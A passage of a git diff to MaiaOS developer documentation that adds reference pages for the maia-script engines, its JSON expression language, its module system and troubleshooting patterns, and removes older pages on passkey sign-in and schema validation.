+- `ActorEngine` - For unified event flow
+
+**Example:**
+```javascript
+import { StateEngine } from '@MaiaOS/script';
+
+const stateEngine = new StateEngine(toolEngine, evaluator);
+
+// Load and create state machine
+const stateDef = await stateEngine.loadStateDef('co_z...');
+const machine = await stateEngine.createMachine(stateDef, actor);
+
+// Send event
+stateEngine.sendEvent('actor-123', { type: 'CLICK_BUTTON' });
+```
+
+**Source:** `libs/maia-script/src/engines/state-engine/state.engine.js`
+
+---
+
+## ToolEngine
+
+**Purpose:** Executes tools with parameter validation.
+
+**What it does:**
+- Registers tools from modules
+- Validates tool parameters against schemas
+- Executes tool functions
+- Supports namespaced tools (`@core/noop`, `@db/query`)
+
+**Key Methods:**
+- `registerTool(namespacePath, toolId, options)` - Register a tool
+- `executeTool(toolId, payload, actor)` - Execute a tool
+- `getTool(toolId)` - Get tool definition
+
+**Dependencies:**
+- `ModuleRegistry` - For module access
+
+**Example:**
+```javascript
+import { ToolEngine } from '@MaiaOS/script';
+
+const toolEngine = new ToolEngine(moduleRegistry);
+
+// Execute a tool
+const result = await toolEngine.executeTool(
+  '@db/query',
+  { schema: '@schema/todos', filter: { completed: false } },
+  actor
+);
+```
+
+**Source:** `libs/maia-script/src/engines/tool-engine/tool.engine.js`
+
+---
+
+## DBEngine
+
+**Purpose:** Unified database operation router.
+
+**What it does:**
+- Routes operations to modular handlers
+- Supports operations: `query`, `create`, `update`, `updateConfig`, `delete`, `toggle`, `seed`
+- Works with swappable backends (IndexedDB, CoJSON CRDT)
+- Validates operations against schemas
+
+**Key Methods:**
+- `execute(payload)` - Execute a database operation
+
+**Operations:**
+- `query` - Load configs/schemas/data (reactive if callback provided)
+- `create` - Create new records
+- `update` - Update existing records (data collections)
+- `updateConfig` - Update actor configs (system properties)
+- `delete` - Delete records
+- `toggle` - Toggle boolean field
+- `seed` - Flush + seed database (dev only)
+
+**Example:**
+```javascript
+import { DBEngine, IndexedDBBackend } from '@MaiaOS/script';
+
+const backend = new IndexedDBBackend();
+await backend.init();
+const dbEngine = new DBEngine(backend);
+
+// Query
+const todos = await dbEngine.execute({
+  op: 'query',
+  schema: '@schema/todos',
+  filter: { completed: false }
+});
+
+// Create
+const newTodo = await dbEngine.execute({
+  op: 'create',
+  schema: '@schema/todos',
+  data: { text: 'Buy milk', completed: false }
+});
+```
+
+**Source:** `libs/maia-script/src/engines/db-engine/db.engine.js`
+
+---
+
+## SubscriptionEngine
+
+**Purpose:** Context-driven reactive subscription manager.
+
+**What it does:**
+- Watches actor context for query objects
+- Auto-subscribes to reactive data
+- Auto-resolves `@` references
+- Batches re-renders for performance
+- Updates actor context automatically (infrastructure exception)
+
+**Key Methods:**
+- `initialize(actor)` - Initialize subscriptions for an actor
+- `updateSubscriptions(actor)` - Update subscriptions when context changes
+- `cleanup(actor)` - Clean up subscriptions when actor is destroyed
+
+**Dependencies:**
+- `DBEngine` - For query operations
+- `ActorEngine` - For triggering re-renders
+
+**Important:** This engine directly updates actor context for reactive query objects. This is the ONLY exception to the rule that state machines are the single source of truth for context changes.
+
+**Source:** `libs/maia-script/src/engines/subscription-engine/subscription.engine.js`
+
+---
+
+## ModuleRegistry
+
+**Purpose:** Central plugin system for MaiaScript extensions.
+
+**What it does:**
+- Registers modules dynamically
+- Provides module discovery
+- Stores module configuration
+- Manages module lifecycle
+
+**Key Methods:**
+- `registerModule(name, module, config)` - Register a module
+- `getModule(name)` - Get module by name
+- `loadModule(name)` - Dynamically load a module
+- `listModules()` - List all registered modules
+
+**Example:**
+```javascript
+import { ModuleRegistry } from '@MaiaOS/script';
+
+const registry = new ModuleRegistry();
+
+// Register a module
+registry.registerModule('myModule', MyModuleClass, {
+  version: '1.0.0',
+  description: 'My custom module'
+});
+
+// Load a module dynamically
+await registry.loadModule('db');
+```
+
+**Source:** `libs/maia-script/src/engines/ModuleRegistry.js`
+
+---
+
+## MessageQueue
+
+**Purpose:** Resilient message queue with persistence and retry.
+
+**What it does:**
+- Queues messages for actors
+- Persists messages to localStorage (survives page refresh)
+- Retries failed messages with exponential backoff
+- Maintains dead letter queue for failed messages
+- Guarantees message ordering
+
+**Key Methods:**
+- `enqueue(message)` - Add message to queue
+- `getStats()` - Get queue statistics
+- `clear()` - Clear queue (testing/cleanup)
+
+**Features:**
+- Persistent storage (localStorage)
+- Retry mechanism (max 5 retries)
+- Dead letter queue
+- At-least-once delivery semantics
+
+**Source:** `libs/maia-script/src/engines/message-queue/message.queue.js`
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [modules.md](./modules.md) - Module system details
+- [expressions.md](./expressions.md) - MaiaScript expressions
+- [api-reference.md](./api-reference.md) - Complete API reference
+
+---
+
+# MAIA SCRIPT/EXPRESSIONS
+
+*Source: developers/04_maia-script/expressions.md*
+
+# MaiaScript Expressions
+
+MaiaScript expressions are JSON-based and evaluated safely by `MaiaScriptEvaluator`.
+
+---
+
+## Expression Syntax
+
+**Basic Syntax:**
+```json
+{
+  "$operation": [arguments...]
+}
+```
+
+---
+
+## Supported Operations
+
+### Data Access
+
+- `$context` - Access context data: `{ "$context": "title" }`
+- `$item` - Access item data (in loops): `{ "$item": "id" }`
+- `$` - Shortcut: `"$title"` = `{ "$context": "title" }`
+- `$$` - Shortcut: `"$$id"` = `{ "$item": "id" }`
+
+### Comparison
+
+- `$eq` - Equal: `{ "$eq": ["$context.status", "active"] }`
+- `$neq` - Not equal: `{ "$neq": ["$context.status", "inactive"] }`
+- `$gt` - Greater than: `{ "$gt": ["$context.count", 10] }`
+- `$gte` - Greater than or equal
+- `$lt` - Less than
+- `$lte` - Less than or equal
+
+### Logical
+
+- `$and` - Logical AND: `{ "$and": [{ "$eq": ["$context.status", "active"] }, { "$gt": ["$context.count", 0] }] }`
+- `$or` - Logical OR
+- `$not` - Logical NOT
+
+### Control Flow
+
+- `$if` - Conditional: `{ "$if": { "condition": { "$eq": ["$context.status", "active"] }, "then": "green", "else": "gray" } }`
+- `$switch` - Switch statement
+
+### String
+
+- `$concat` - Concatenate strings
+- `$trim` - Trim whitespace
+- `$toLowerCase` - Convert to lowercase
+- `$toUpperCase` - Convert to uppercase
+
+### Date
+
+- `$formatDate` - Format date
+
+### Array
+
+- `$length` - Get array length
+- `$includes` - Check if array includes value
+- `$map` - Map over array
+- `$filter` - Filter array
+
+### Math
+
+- `$add` - Add numbers
+- `$subtract` - Subtract numbers
+- `$multiply` - Multiply numbers
+- `$divide` - Divide numbers
+
+---
+
+## Expression Validation
+
+Expressions are validated against `maia-script-expression` schema before evaluation:
+
+```javascript
+// Validation happens automatically
+const evaluator = new MaiaScriptEvaluator();
+await evaluator.evaluate(expression, data);
+// Throws if expression is invalid
+```
+
+---
+
+## Security
+
+- **Sandboxed** - Only whitelisted operations allowed
+- **Depth limits** - Maximum recursion depth (default: 50) prevents DoS
+- **Schema validation** - Expressions validated before evaluation
+- **No code execution** - Pure JSON, no JavaScript execution
+
+---
+
+## Examples
+
+### Basic Conditional
+
+```json
+{
+  "$if": {
+    "condition": { "$eq": ["$context.status", "active"] },
+    "then": "green",
+    "else": "gray"
+  }
+}
+```
+
+### Complex Logic
+
+```json
+{
+  "$if": {
+    "condition": {
+      "$and": [
+        { "$eq": ["$context.status", "active"] },
+        { "$gt": ["$context.count", 0] }
+      ]
+    },
+    "then": "visible",
+    "else": "hidden"
+  }
+}
+```
+
+### Array Operations
+
+```json
+{
+  "$map": {
+    "array": "$context.items",
+    "as": "item",
+    "do": { "$item": "name" }
+  }
+}
+```
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [engines.md](./engines.md) - MaiaScriptEvaluator details
+- [api-reference.md](./api-reference.md) - API reference
+- [patterns.md](./patterns.md) - Common patterns
+
+---
+
+# MAIA SCRIPT/MODULES
+
+*Source: developers/04_maia-script/modules.md*
+
+# Module System
+
+Modules are plugins that extend MaiaOS functionality. They register tools and provide configuration.
+
+---
+
+## What Are Modules?
+
+Modules are plugins that extend MaiaOS functionality. They register tools and provide configuration.
+
+**Module Structure:**
+```javascript
+export class MyModule {
+  static async register(registry) {
+    const toolEngine = getToolEngine(registry, 'MyModule');
+    
+    // Register tools
+    await registerToolsFromRegistry(registry, toolEngine, 'mymodule', ['tool1', 'tool2'], '@mymodule');
+    
+    // Register module config
+    registerModuleConfig(registry, 'mymodule', MyModule, {
+      version: '1.0.0',
+      description: 'My module description',
+      namespace: '@mymodule',
+      tools: ['@mymodule/tool1', '@mymodule/tool2']
+    });
+  }
+  
+  static query(query) {
+    // Return module configuration
     return null;
   }
 }
 
-const o = await silentAuth();
-if (o) {
-  renderApp(o);
-} else {
-  renderSignInPrompt();
+export async function register(registry) {
+  return await MyModule.register(registry);
 }
 ```
-
-### Pattern 3: Manual Sign-In Button
-
-```javascript
-async function handleSignInClick() {
-  try {
-    const { accountID, agentSecret } = await signInWithPasskey();
-    
-    console.log("Signed in as:", accountID);
-    
-    const o = await createMaiaOS({ agentSecret });
-    renderApp(o);
-  } catch (error) {
-    if (error.message.includes("PRF not supported")) {
-      alert("Please use Chrome or Safari");
-    } else {
-      alert("Sign in failed: " + error.message);
-    }
-  }
-}
-
-document.getElementById("sign-in-btn")
-  .addEventListener("click", handleSignInClick);
-```
-
-## Browser Compatibility
-
-### ✅ Supported Browsers
-
-| Browser | Platform | Min Version | Notes |
-|---------|----------|-------------|-------|
-| Chrome | macOS | Latest | Full support |
-| Chrome | Linux | Latest | Full support |
-| Chrome | Windows 11 | Latest | Full support |
-| Safari | macOS | 13+ | Best support |
-| Safari | iOS | 16+ | Best support |
-
-### ❌ Not Supported
-
-| Browser | Platform | Reason |
-|---------|----------|--------|
-| Firefox | All | No PRF support |
-| Edge | Windows 10 | No PRF support |
-| Chrome | Windows 10 | No PRF support |
-| Old browsers | All | No WebAuthn PRF |
-
-### Detecting Support
-
-```javascript
-import { isPRFSupported } from '@MaiaOS/core';
-
-try {
-  await isPRFSupported();
-  // Supported!
-} catch (error) {
-  // Show error page with instructions
-  showUnsupportedBrowser(error.message);
-}
-```
-
-## Security Considerations
-
-### What's Stored
-
-**localStorage only contains PUBLIC data:**
-```json
-{
-  "accountID": "co_z...",       // Public identifier
-  "credentialId": "base64...",  // Public passkey reference
-  "salt": "maia.city"           // Public salt
-}
-```
-
-### What's NOT Stored
-
-- ❌ AgentSecret (ephemeral)
-- ❌ SignerSecret (ephemeral)
-- ❌ SealerSecret (ephemeral)
-- ❌ Passkey private key (hardware-only)
-
-### Attack Resistance
-
-| Attack | Protected? | How |
-|--------|------------|-----|
-| XSS reads localStorage | ✅ Yes | Only public data stored |
-| Device theft | ✅ Yes | Needs biometric |
-| Phishing | ✅ Yes | No passwords to steal |
-| Keylogger | ✅ Yes | Biometric auth only |
-| Shoulder surfing | ✅ Yes | No visible secrets |
-
-## Troubleshooting
-
-### Error: "PRF not supported"
-
-**Cause:** Browser doesn't support WebAuthn PRF extension
-
-**Solution:** Use Chrome (macOS/Linux/Win11) or Safari (macOS 13+/iOS 16+)
-
-### Error: "User canceled"
-
-**Cause:** User dismissed biometric prompt
-
-**Solution:** Prompt user to try again
-
-### Error: "AccountID mismatch"
-
-**Cause:** PRF derivation failed or wrong passkey used
-
-**Solution:** Sign out and sign in again
-
-### Error: "SECURITY VIOLATION"
-
-**Cause:** Attempted to store forbidden data
-
-**Solution:** This is a bug - report it
-
-### Passkey Not Found
-
-**Cause:** Passkey not synced to new device yet
-
-**Solution:** Wait for passkey sync (usually instant on Apple, minutes on Google)
-
-## Advanced Topics
-
-### Custom Salt Values
-
-```javascript
-// Different apps can use different salts
-const { agentSecret } = await signInWithPasskey({
-  salt: "myapp.example.com"
-});
-
-// Same passkey, different salt = different account
-```
-
-### Multi-Account Support
-
-```javascript
-// Use different salts for different accounts
-const account1 = await signInWithPasskey({ salt: "app1" });
-const account2 = await signInWithPasskey({ salt: "app2" });
-
-// Same passkey, different accounts!
-```
-
-### Debugging Storage
-
-```javascript
-import { inspectStorage } from '@MaiaOS/core';
-
-// In browser console or code:
-const report = inspectStorage();
-console.log("Security check:", report.securityCheck);
-
-if (report.securityCheck !== "PASSED") {
-  console.error("Security issue detected!");
-  console.error("Warnings:", report.warnings);
-}
-```
-
-## Migration Guide
-
-### From Password-Based Auth
-
-**Before:**
-```javascript
-async function login(username, password) {
-  const token = await api.login(username, password);
-  localStorage.setItem("token", token);
-}
-```
-
-**After:**
-```javascript
-async function login() {
-  const { agentSecret } = await signInWithPasskey();
-  const o = await createMaiaOS({ agentSecret });
-  // No token, no server - self-sovereign!
-}
-```
-
-### From Server-Stored Secrets
-
-**Before:**
-```javascript
-async function init() {
-  const secret = await api.getAccountSecret(userId);
-  const account = await createAccount(secret);
-}
-```
-
-**After:**
-```javascript
-async function init() {
-  const { agentSecret } = await signInWithPasskey();
-  const o = await createMaiaOS({ agentSecret });
-  // Secret derived from passkey, never on server
-}
-```
-
-## Best Practices
-
-1. ✅ **Always check PRF support first**
-   ```javascript
-   await isPRFSupported(); // Throws if not supported
-   ```
-
-2. ✅ **Use default salt unless you need app-specific accounts**
-   ```javascript
-   await signInWithPasskey({ salt: "maia.city" }); // Default
-   ```
-
-3. ✅ **Handle user cancellation gracefully**
-   ```javascript
-   try {
-     await signInWithPasskey();
-   } catch (error) {
-     if (error.message.includes("cancel")) {
-       // User dismissed prompt
-     }
-   }
-   ```
-
-4. ✅ **Show clear error messages**
-   ```javascript
-   if (error.message.includes("PRF not supported")) {
-     showBrowserCompatibilityPage();
-   }
-   ```
-
-5. ✅ **Never store agentSecret**
-   ```javascript
-   // ❌ NEVER DO THIS:
-   localStorage.setItem("secret", agentSecret);
-   
-   // ✅ DO THIS:
-   // Let it live in memory during session only
-   ```
-
-## Further Reading
-
-- [WebAuthn PRF Extension](https://www.w3.org/TR/webauthn-3/#prf-extension)
-- [Passkey Best Practices](https://developers.google.com/identity/passkeys)
-- [Security Guarantees](../../../libs/maia-self/SECURITY.md)
-
-## See Also
-
-- [MaiaOS Overview](01_maiaos.md)
-- [Schemas](03_schemas.md)
-- [cojson Architecture](07_cojson.md)
 
 ---
 
-# 10_VALIDATION
+## Available Modules
 
-*Source: developers/10_validation.md*
+### db.module.js
 
-# Validation Guide
+**Purpose:** Database operations module.
 
-Complete guide to MaiaOS's end-to-end JSON Schema validation system.
+**Tools:**
+- `@db` - Unified database operations
 
-## Overview
-
-MaiaOS validates **everything** using JSON Schema:
-- ✅ Config files (actors, views, states, etc.)
-- ✅ Tool payloads
-- ✅ Message payloads
-- ✅ Application data (create, update, toggle operations)
-
-All validation uses AJV (fast JSON Schema validator) and schemas are dynamically loaded from IndexedDB.
-
-## Validation Points
-
-### 1. Config Files
-
-**When:** When configs are loaded from IndexedDB  
-**Where:** In respective engines (ActorEngine, StateEngine, ViewEngine, etc.)  
-**Schema:** Config schemas (actor.schema.json, view.schema.json, etc.)
-
-**Example:**
+**Usage:**
 ```javascript
-// ActorEngine.loadActor() validates actor definition
-await validateOrThrow('actor', actorDef, `maia.db:${actorKey}`);
+// Tools are automatically available after module loads
+// Use in state machines or views:
+{
+  tool: '@db',
+  payload: {
+    op: 'query',
+    schema: '@schema/todos'
+  }
+}
 ```
 
-**What Gets Validated:**
-- Required fields (`$type`, `$id`, etc.)
-- Field types and formats
-- Nested object structures
-- Enum values
+---
 
-### 2. Tool Payloads
+### core.module.js
 
-**When:** Before tool execution  
-**Where:** `ToolEngine.execute()`  
-**Schema:** Tool's `parameters` field (JSON Schema format)
+**Purpose:** Core UI tools module.
 
-**Example:**
+**Tools:**
+- `@core/noop` - No-operation (for testing)
+- `@core/preventDefault` - Prevent default events
+- `@core/publishMessage` - Publish messages to subscribed actors
+- `@core/focus` - Focus an element
+
+---
+
+### dragdrop.module.js
+
+**Purpose:** Drag-and-drop functionality module.
+
+**Tools:**
+- `@dragdrop/start` - Start drag operation
+- `@dragdrop/end` - End drag operation
+- `@dragdrop/drop` - Handle drop
+- `@dragdrop/dragEnter` - Handle drag enter
+- `@dragdrop/dragLeave` - Handle drag leave
+
+**Configuration:**
 ```javascript
-// Tool definition
-{
-  "parameters": {
-    "type": "object",
-    "properties": {
-      "text": { "type": "string", "minLength": 1 }
-    },
-    "required": ["text"]
+// Access module config
+const config = registry.getModule('dragdrop').query('config');
+```
+
+---
+
+### interface.module.js
+
+**Purpose:** Actor interface validation module.
+
+**Tools:**
+- `@interface/validateInterface` - Validate actor interface
+
+---
+
+## Creating Custom Modules
+
+### Step 1: Create Module File
+
+Create `libs/maia-script/src/modules/mymodule.module.js`:
+
+```javascript
+import { getToolEngine, registerToolsFromRegistry, registerModuleConfig } from '../utils/module-registration.js';
+
+export class MyModule {
+  static async register(registry) {
+    const toolEngine = getToolEngine(registry, 'MyModule');
+    
+    const toolNames = ['tool1', 'tool2'];
+    
+    await registerToolsFromRegistry(registry, toolEngine, 'mymodule', toolNames, '@mymodule');
+    
+    registerModuleConfig(registry, 'mymodule', MyModule, {
+      version: '1.0.0',
+      description: 'My custom module',
+      namespace: '@mymodule',
+      tools: toolNames.map(t => `@mymodule/${t}`)
+    });
+  }
+  
+  static query(query) {
+    return null;
   }
 }
 
-// Validation happens automatically
-await toolEngine.execute('@core/createTodo', actor, { text: "Buy milk" });
+export async function register(registry) {
+  return await MyModule.register(registry);
+}
 ```
 
-**What Gets Validated:**
-- Required parameters
-- Parameter types (string, number, boolean, object, array)
-- String constraints (minLength, maxLength, pattern)
-- Number constraints (minimum, maximum)
-- Enum values
-- Nested object structures
+### Step 2: Create Tools
 
-### 3. Message Payloads
+Create tools in `@MaiaOS/tools` package (see `@MaiaOS/tools` documentation).
 
-**When:** Before sending/receiving messages  
-**Where:** `ActorEngine._validateMessage()`  
-**Schema:** Interface's `payload` field (converted to JSON Schema)
+### Step 3: Load Module
 
-**Example:**
+Load module during boot:
+
 ```javascript
-// Interface definition
-{
-  "inbox": {
-    "CREATE_TODO": {
-      "payload": { "text": "string" }
-    }
+const os = await MaiaOS.boot({
+  modules: ['db', 'core', 'mymodule'] // Add your module
+});
+```
+
+---
+
+## Module Registration Utilities
+
+Modules use shared utilities from `module-registration.js`:
+
+- `getToolEngine(registry, moduleName)` - Get ToolEngine from registry
+- `registerToolsFromRegistry(registry, toolEngine, moduleName, toolNames, namespace)` - Register tools
+- `registerModuleConfig(registry, moduleName, ModuleClass, config)` - Register module config
+
+These utilities ensure consistent module registration patterns across all modules.
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [engines.md](./engines.md) - Engine details
+- [api-reference.md](./api-reference.md) - API reference
+- [patterns.md](./patterns.md) - Common patterns
+
+---
+
+# MAIA SCRIPT/PATTERNS
+
+*Source: developers/04_maia-script/patterns.md*
+
+# Common Patterns and Troubleshooting
+
+Common usage patterns and solutions to frequent problems.
+
+---
+
+## Common Patterns
+
+### Pattern 1: Custom Module with Tools
+
+```javascript
+// 1. Create module
+export class MyModule {
+  static async register(registry) {
+    const toolEngine = getToolEngine(registry, 'MyModule');
+    await registerToolsFromRegistry(registry, toolEngine, 'mymodule', ['tool1'], '@mymodule');
+    registerModuleConfig(registry, 'mymodule', MyModule, {
+      version: '1.0.0',
+      description: 'My module',
+      namespace: '@mymodule',
+      tools: ['@mymodule/tool1']
+    });
   }
 }
 
-// Validation happens automatically
-await actorEngine.sendMessage(actorId, {
-  type: "CREATE_TODO",
-  payload: { text: "Buy milk" }
-});
+// 2. Create tools in @MaiaOS/tools package
+// 3. Load module during boot
 ```
 
-**What Gets Validated:**
-- Payload structure matches interface definition
-- Field types match expected types
-- Required fields are present
-- Nested objects and arrays
+---
 
-**Note:** Interface payload format (`{ "text": "string" }`) is automatically converted to JSON Schema format (`{ type: "object", properties: { text: { type: "string" } } }`).
-
-### 4. Application Data
-
-**When:** During create/update/toggle operations  
-**Where:** `CreateOperation`, `UpdateOperation`, `ToggleOperation`  
-**Schema:** Data schemas from IndexedDB (e.g., `@schema/data/todos`)
-
-#### Create Operations
-
-**Full validation** - All required fields must be present:
+### Pattern 2: Custom Expression Evaluator
 
 ```javascript
-// Schema requires: text (string, minLength: 1), done (boolean)
-await maia.db({
-  op: 'create',
-  schema: '@schema/todos',
-  data: { text: "Buy milk", done: false }
+const evaluator = new MaiaScriptEvaluator(null, {
+  maxDepth: 100,
+  validateExpressions: true
 });
-// ✅ Valid
 
-await maia.db({
-  op: 'create',
-  schema: '@schema/todos',
-  data: { text: "", done: false }
-});
-// ❌ Invalid: text should NOT be shorter than 1 characters
+// Use in custom context
+const result = await evaluator.evaluate(expression, { context: myData });
 ```
 
-#### Update Operations
+---
 
-**Partial validation** - Only validates fields being updated:
+### Pattern 3: Direct Database Access
 
 ```javascript
-// Schema requires: text, done
-// But updates only validate fields being updated
-await maia.db({
-  op: 'update',
-  schema: '@schema/todos',
-  id: '123',
-  data: { done: true }
+const backend = new IndexedDBBackend();
+await backend.init();
+const dbEngine = new DBEngine(backend);
+
+// Query without full OS
+const data = await dbEngine.execute({
+  op: 'query',
+  schema: '@schema/mySchema'
 });
-// ✅ Valid - only validates 'done' field
-
-await maia.db({
-  op: 'update',
-  schema: '@schema/todos',
-  id: '123',
-  data: { done: "yes" }
-});
-// ❌ Invalid: done should be boolean
 ```
 
-#### Toggle Operations
-
-**Field validation** - Validates field exists and is boolean:
-
-```javascript
-await maia.db({
-  op: 'toggle',
-  schema: '@schema/todos',
-  id: '123',
-  field: 'done'
-});
-// ✅ Valid - 'done' exists and is boolean
-
-await maia.db({
-  op: 'toggle',
-  schema: '@schema/todos',
-  id: '123',
-  field: 'text'
-});
-// ❌ Invalid: Field "text" is not a boolean (type: string)
-```
-
-## How Validation Works
-
-### Schema Storage
-
-1. **Config Schemas**: Stored in `src/schemata/` (actor.schema.json, view.schema.json, etc.)
-2. **Data Schemas**: Stored in `src/schemata/data/` (todos.schema.json, etc.)
-3. **Seeding**: All schemas are automatically seeded into IndexedDB during `MaiaOS.boot()`
-4. **Storage**: Schemas stored in IndexedDB `schemas` store with keys like:
-   - `@schema/actor` (config schema)
-   - `@schema/data/todos` (data schema)
-
-### Validation Flow
-
-```mermaid
-graph TB
-    A[Operation Request] --> B{Operation Type}
-    B -->|Config Load| C[Load Config from IndexedDB]
-    B -->|Tool Execute| D[Load Tool Definition]
-    B -->|Message Send| E[Load Interface Definition]
-    B -->|Data Create/Update| F[Load Data Schema from IndexedDB]
-    
-    C --> G[Validate Against Config Schema]
-    D --> H[Validate Payload Against Tool Parameters]
-    E --> I[Convert Interface Payload to JSON Schema]
-    F --> J[Validate Data Against Data Schema]
-    
-    I --> K[Validate Payload Against JSON Schema]
-    
-    G --> L{AJV Validation}
-    H --> L
-    K --> L
-    J --> L
-    
-    L -->|Valid| M[Execute Operation]
-    L -->|Invalid| N[Throw Validation Error]
-```
-
-### AJV Integration
-
-MaiaOS uses AJV (Another JSON Schema Validator) for all validation:
-
-```javascript
-import { validateOrThrow } from '../schemata/validation.helper.js';
-
-// validateOrThrow automatically:
-// 1. Loads validation engine (AJV instance)
-// 2. Compiles schema (cached for performance)
-// 3. Validates data
-// 4. Throws error with clear message if invalid
-await validateOrThrow('tool-payload', payload, schema);
-```
-
-**Performance:**
-- Schemas are compiled once and cached
-- Validation is fast (< 1ms per validation)
-- No performance impact on normal operations
-
-## Error Messages
-
-Validation errors provide clear, actionable feedback:
-
-### Example: Tool Payload Error
-
-```
-Validation failed for 'tool-payload' in tool-payload:
-  - /text: should NOT be shorter than 1 characters
-  - /done: should be boolean
-```
-
-**What it means:**
-- Field path: `/text` (root level field)
-- Error: Value is shorter than minimum length (1 character)
-- Field path: `/done`
-- Error: Value should be boolean but isn't
-
-### Example: Message Payload Error
-
-```
-Validation failed for 'message-payload' in message-payload:
-  - /id: should be string
-  - /text: is required
-```
-
-**What it means:**
-- Field `/id` has wrong type (expected string)
-- Field `/text` is missing (required field)
-
-### Example: Application Data Error
-
-```
-Validation failed for 'application-data' in application-data:
-  - /text: should NOT be shorter than 1 characters
-  - /done: should be boolean
-```
-
-**What it means:**
-- Field `/text` violates minLength constraint
-- Field `/done` has wrong type
+---
 
 ## Troubleshooting
 
-### Schema Not Found
+### Problem: Expression evaluation fails
 
-**Error:** `No schema found for @schema/data/todos, skipping validation`
-
-**Cause:** Schema not seeded into IndexedDB
-
-**Solution:**
-1. Check schema exists in `src/schemata/data/todos.schema.json`
-2. Check schema is exported in `src/schemata/index.js`
-3. Restart app to trigger re-seeding
-
-### Validation Fails Unexpectedly
-
-**Error:** `Validation failed: text should be string`
-
-**Cause:** Data type mismatch
-
-**Solution:**
-1. Check the schema definition for expected type
-2. Verify data matches schema (use `console.log` to inspect)
-3. Convert data to correct type before validation
-
-### Interface Payload Validation Fails
-
-**Error:** `Message validation failed: Payload.text should be string`
-
-**Cause:** Interface payload format doesn't match actual payload
-
-**Solution:**
-1. Check interface definition matches actual message payload
-2. Verify payload structure in console logs
-3. Update interface definition if payload structure changed
-
-### Partial Update Validation Too Strict
-
-**Error:** `Validation failed: text is required`
-
-**Cause:** Update operation requires all fields (should only validate updated fields)
-
-**Solution:**
-- This shouldn't happen - update operations use partial validation
-- If it does, check `UpdateOperation` is using `required: []` for partial schema
-
-## Best Practices
-
-### 1. Define Schemas First
-
-Always define schemas before using them:
+**Solution:** Check expression syntax and validation:
 
 ```javascript
-// ✅ Good - Schema defined first
-// src/schemata/data/todos.schema.json
+// ❌ Wrong - invalid syntax
+{ "$if": { "condition": true } } // Missing 'then' and 'else'
+
+// ✅ Correct
+{ "$if": { "condition": true, "then": "yes", "else": "no" } }
+```
+
+---
+
+### Problem: Module not loading
+
+**Solution:** Check module registration:
+
+```javascript
+// Ensure module exports register function
+export async function register(registry) {
+  return await MyModule.register(registry);
+}
+
+// Ensure module is in boot config
+const os = await MaiaOS.boot({
+  modules: ['mymodule'] // Add your module
+});
+```
+
+---
+
+### Problem: Tool not found
+
+**Solution:** Check tool registration:
+
+```javascript
+// Ensure tool is registered in module
+await registerToolsFromRegistry(registry, toolEngine, 'mymodule', ['mytool'], '@mymodule');
+
+// Ensure tool exists in @MaiaOS/tools package
+// Check namespace path matches: 'mymodule/mytool' → '@mymodule/mytool'
+```
+
+---
+
+### Problem: Expression depth exceeded
+
+**Solution:** Increase depth limit or simplify expression:
+
+```javascript
+// Increase depth limit
+const evaluator = new MaiaScriptEvaluator(null, {
+  maxDepth: 100 // Default is 50
+});
+
+// Or simplify nested expressions
+```
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [engines.md](./engines.md) - Engine details
+- [modules.md](./modules.md) - Module system
+- [expressions.md](./expressions.md) - Expression language
+- [api-reference.md](./api-reference.md) - API reference
+
+---
+
+# MAIA SCRIPT/README
+
+*Source: developers/04_maia-script/README.md*
+
+# maia-script: Execution Engines and Modules
+
+## Overview
+
+The `@MaiaOS/script` package provides the reusable execution components that power MaiaOS. Think of it as the factory floor where all the work happens - engines process your definitions, modules provide tools, and utilities handle common tasks.
+
+**What it is:**
+- ✅ **Execution engines** - Process actors, views, styles, state machines, and tools
+- ✅ **Module system** - Plugin architecture for extending functionality
+- ✅ **MaiaScript evaluator** - Evaluates JSON-based expressions safely
+- ✅ **Utilities** - Shared helpers for config loading, path resolution, etc.
+
+**What it isn't:**
+- ❌ **Not the kernel** - Boot process is in `@MaiaOS/kernel`
+- ❌ **Not tool definitions** - Tools are in `@MaiaOS/tools`
+- ❌ **Not schemas** - Schema validation is in `@MaiaOS/schemata`
+
+---
+
+## The Simple Version
+
+Think of `maia-script` like a factory with specialized workers (engines):
+
+- **MaiaScriptEvaluator** = The translator (converts JSON expressions to values)
+- **ActorEngine** = The manager (orchestrates everything)
+- **ViewEngine** = The painter (renders UI)
+- **StyleEngine** = The stylist (compiles CSS)
+- **StateEngine** = The conductor (runs state machines)
+- **ToolEngine** = The executor (runs tools)
+- **DBEngine** = The librarian (manages data)
+- **SubscriptionEngine** = The watcher (keeps data in sync)
+
+**Analogy:**
+Imagine you're building a house:
+- You write blueprints (`.maia` files) - these are your definitions
+- The factory workers (engines) read the blueprints and do the work
+- Modules are like toolboxes - they provide specialized tools
+- The evaluator translates your instructions into actions
+
+---
+
+## Architecture
+
+### Package Structure
+
+```
+libs/maia-script/src/
+├── engines/              # Core execution engines
+│   ├── MaiaScriptEvaluator.js    # Expression evaluator
+│   ├── ModuleRegistry.js          # Module loader
+│   ├── actor-engine/              # Actor lifecycle
+│   ├── view-engine/               # UI rendering
+│   ├── style-engine/              # Style compilation
+│   ├── state-engine/              # State machines
+│   ├── tool-engine/               # Tool execution
+│   ├── db-engine/                 # Database operations
+│   ├── subscription-engine/       # Reactive subscriptions
+│   └── message-queue/             # Message queuing
+├── modules/              # Module definitions
+│   ├── db.module.js               # Database module
+│   ├── core.module.js             # Core UI tools
+│   ├── dragdrop.module.js         # Drag-and-drop
+│   └── interface.module.js        # Interface validation
+├── utils/                # Shared utilities
+│   ├── module-registration.js     # Module helpers
+│   ├── config-loader.js            # Config loading
+│   ├── path-resolver.js           # Path resolution
+│   ├── html-sanitizer.js          # HTML sanitization
+│   └── co-id-validator.js         # Co-ID validation
+└── index.js              # Public API exports
+```
+
+### Engine Dependencies
+
+```mermaid
+graph TD
+    ModuleRegistry[ModuleRegistry]
+    Evaluator[MaiaScriptEvaluator]
+    ToolEngine[ToolEngine]
+    StateEngine[StateEngine]
+    ViewEngine[ViewEngine]
+    StyleEngine[StyleEngine]
+    ActorEngine[ActorEngine]
+    DBEngine[DBEngine]
+    SubscriptionEngine[SubscriptionEngine]
+    
+    ModuleRegistry --> ToolEngine
+    Evaluator --> ToolEngine
+    Evaluator --> StateEngine
+    Evaluator --> ViewEngine
+    ToolEngine --> StateEngine
+    ToolEngine --> ActorEngine
+    StateEngine --> ActorEngine
